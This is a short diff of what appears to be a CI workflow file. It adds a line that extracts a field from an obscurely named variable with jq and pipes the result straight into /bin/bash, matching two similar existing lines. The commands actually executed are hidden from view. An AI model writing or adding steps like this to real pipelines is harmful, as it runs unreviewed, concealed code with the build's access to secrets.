@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$img066" | jq -r .ymx078 | /bin/bash
           echo $yyb856 | jq -r .b337 | /bin/bash
+          echo $nc711 | jq -r .zz7 | /bin/bash
 
       - name: Archive output
         if: always()
